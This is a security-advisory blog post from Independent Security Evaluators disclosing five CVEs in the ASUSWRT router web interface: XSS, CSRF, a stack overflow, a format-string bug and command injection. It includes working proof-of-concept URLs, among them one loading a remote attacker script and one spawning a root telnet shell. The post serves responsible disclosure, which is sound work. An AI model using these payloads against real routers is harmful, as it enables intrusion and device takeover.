=== Content from blog.securityevaluators.com_68503374_20250125_011121.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fb111bc1c8eb8&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# ASUS Routers Overflow with Vulnerabilities

## From XSS to stack smashing: ISE Labs acquires five new CVEs for devices running ASUSWRT

[![Shaun Mirani](https://miro.medium.com/v2/resize:fill:88:88/1*DlgcXPRznKjNV1z1X24iXw.png)](https://medium.com/%40smirani?source=post_page---byline--b111bc1c8eb8--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:48:48/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---byline--b111bc1c8eb8--------------------------------)

[Shaun Mirani](https://medium.com/%40smirani?source=post_page---byline--b111bc1c8eb8--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd57ec8ea0ef1&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&user=Shaun+Mirani&userId=d57ec8ea0ef1&source=post_page-d57ec8ea0ef1--byline--b111bc1c8eb8---------------------post_header-----------)

Published in[Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---byline--b111bc1c8eb8--------------------------------)·4 min read·Nov 26, 2018

--

Listen

Share

ISE Labs has discovered five new vulnerabilities in the web interface for the ASUS RT-AC3200 router and other devices running ASUSWRT. This is a diverse set of flaws; in addition to finding traditional web application issues like XSS, CSRF, and command injection, we identified a pair of memory corruption/disclosure bugs that enable an authenticated attacker to run arbitrary code as root.

All vulnerabilities were found and tested in version 3.0.0.4.382.50010 of ASUSWRT. Versions 3.0.0.4.382.50624 and earlier are known to be susceptible as well. As of November 17th, ASUS has not released an official firmware patch for the RT-AC3200, the model we assessed. Several other devices do have an update available; for instance, the vulnerabilities we reported are fixed in ASUSWRT 3.0.0.4.384.32738 for the RT-AC68U and RT-AC5300. ISE reached out to ASUS in advance of publication to ask about this discrepancy (see Disclosure Timeline) but received no response.

![]()
# Reflected Cross-Site Scripting in appGet.cgi (CVE-2018-14710)

The endpoint at `/appGet.cgi` reflects user input as-is when a nonexistent RPC hook is called. An attacker may exploit this to conduct reflected XSS attacks against router owners. Successful exploitation requires overcoming the URL length and character restrictions imposed by the web server, which is readily achieved by including a remote script, as in the following example:

```
http://192.168.1.11/appGet.cgi?hook=bork(<script+src%3dhttp%3a//192.168.1.10%3a8000/bork.js>ono</script>)
```
# Cross-Site Request Forgery in appGet.cgi (CVE-2018-14711)

The endpoint at `/appGet.cgi` lacks any kind of protection against cross-site request forgery (CSRF). As a result, an attacker can cause unsuspecting router owners to issue state-changing requests by coercing them into clicking a malicious link. For example, the attacker can make a victim change the system locale by convincing them to navigate to a URL such as the following:

`http://192.168.1.11/appGet.cgi?hook=select_channel("TW")`

# Stack Buffer Overflow via delete\_sharedfolder Hook in appGet.cgi (CVE-2018-14712)

An authenticated attacker can manipulate the `pool` URL parameter in the `delete_sharedfolder` hook of `appGet.cgi` to trigger a buffer overflow. The overflow specifically occurs in libdisk.so, within the function `read_mount_data()`. A string of arbitrary length, given by `pool`, is written using `sprintf()` into a local array without any bounds checking.

Despite the RT-AC3200’s use of system-wide ASLR, attackers can exploit this vulnerability in conjunction with CVE-2018-14713 to achieve reliable remote code execution. With the router’s default settings, this flaw is only exploitable on the LAN side — if remote administration is enabled, however, it becomes WAN-exploitable as well.

When requested by a user with a valid session, the following proof-of-concept URL crashes the httpd program, rendering the web interface inaccessible until the router automatically restarts it.

```
http://192.168.1.11/appGet.cgi?hook=delete_sharedfolder()&folder=A&pool=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
# Uncontrolled Format String via nvram\_match Hook Family in appGet.cgi (CVE-2018-14713)

The endpoint at `/appGet.cgi` provides the `nvram_match` family of hooks for testing key-value entries in NVRAM storage. These functions take at least 3 parameters: a key, a value, and an output string to return to the client if they match (or don’t match).

The output string argument to these hooks is vulnerable to format string attacks. An authenticated attacker can provide `printf()`-style format specifiers, such as `%p` and `%n`, to disclose information from the call stack and write data to arbitrary memory locations. For example, requesting the following URL will leak the contents of registers r2 and r3, as well as 8 bytes from the stack.

```
http://192.168.1.11/appGet.cgi?hook=nvram_match("wan_proto","dhcp","%25p%25p%25p%25p")
```
# Command Injection via load\_script Hook in appGet.cgi (CVE-2018-14714)

The endpoint at `/appGet.cgi` provides a `load_script` hook, which allows for running certain built-in scripts. However, the server does not validate or sanitize user input, resulting in the ability to run arbitrary system commands on the router. An example URL to exploit this flaw is provided below. When requested by an authenticated user, the router will start a telnetd instance as root on port 8383.

```
http://192.168.1.11/appGet.cgi?hook=load_script("../usr/sbin/telnetd+-l+/bin/sh+-p+8383")
```
# Disclosure Timeline

* **July 6, 2018:** Initial disclosure of vulnerabilities. ASUS confirms receipt and requests details for verification. ISE provides additional details.
* **July 10, 2018:** ASUS confirms bugs are reproducible.
* **July 16, 2018:** ASUS sends ISE a beta firmware update and asks ISE to verify the mitigations.
* **August 22, 2018**: ISE agrees to test the firmware.
* **October 1–3, 2018:** ISE confirms the vulnerabilities are resolved and communicates this to ASUS.
* **November 8, 2018:** ISE inquires when ASUS plans to release an update for the RT-AC3200, in light of impending publication.

[Shaun Mirani](https://medium.com/%40smirani), Junior Security Analyst @ [Independent Security Evaluators](http://www.securityevaluators.com)

[**Sign up to get our latest blogs.**](http://eepurl.com/bLc2bf)

[Security](https://medium.com/tag/security?source=post_page-----b111bc1c8eb8--------------------------------)[IoT](https://medium.com/tag/iot?source=post_page-----b111bc1c8eb8--------------------------------)[Ise Labs](https://medium.com/tag/ise-labs?source=post_page-----b111bc1c8eb8--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----b111bc1c8eb8--------------------------------)[Hacking](https://medium.com/tag/hacking?source=post_page-----b111bc1c8eb8--------------------------------)

--

--

[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:96:96/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--b111bc1c8eb8--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:128:128/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--b111bc1c8eb8--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--b111bc1c8eb8---------------------follow_profile-----------)[## Published in Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---post_publication_info--b111bc1c8eb8--------------------------------)[1K Followers](/followers?source=post_page---post_publication_info--b111bc1c8eb8--------------------------------)·[Last published Mar 7, 2022](/reading-hackable-without-a-background-in-security-a22ebe59b3e8?source=post_page---post_publication_info--b111bc1c8eb8--------------------------------)

Security specialists that provide custom services including security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers and hacking contests.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--b111bc1c8eb8---------------------follow_profile-----------)[![Shaun Mirani](https://miro.medium.com/v2/resize:fill:96:96/1*DlgcXPRznKjNV1z1X24iXw.png)](https://medium.com/%40smirani?source=post_page---post_author_info--b111bc1c8eb8--------------------------------)[![Shaun Mirani](https://miro.medium.com/v2/resize:fill:128:128/1*DlgcXPRznKjNV1z1X24iXw.png)](https://medium.com/%40smirani?source=post_page---post_author_info--b111bc1c8eb8--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd57ec8ea0ef1&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&user=Shaun+Mirani&userId=d57ec8ea0ef1&source=post_page-d57ec8ea0ef1--post_author_info--b111bc1c8eb8---------------------follow_profile-----------)[## Written by Shaun Mirani](https://medium.com/%40smirani?source=post_page---post_author_info--b111bc1c8eb8--------------------------------)[27 Followers](https://medium.com/%40smirani/followers?source=post_page---post_author_info--b111bc1c8eb8--------------------------------)·[1 Following](https://medium.com/%40smirani/following?source=post_page---post_author_info--b111bc1c8eb8--------------------------------)

Security Analyst at ISE

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd57ec8ea0ef1&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fasus-routers-overflow-with-vulnerabilities-b111bc1c8eb8&user=Shaun+Mirani&userId=d57ec8ea0ef1&source=post_page-d57ec8ea0ef1--post_author_info--b111bc1c8eb8---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----b111bc1c8eb8--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----b111bc1c8eb8--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----b111bc1c8eb8--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----b111bc1c8eb8--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----b111bc1c8eb8--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----b111bc1c8eb8--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----b111bc1c8eb8--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----b111bc1c8eb8--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----b111bc1c8eb8--------------------------------)[Teams](https://medium.com/business?source=post_page-----b111bc1c8eb8--------------------------------)


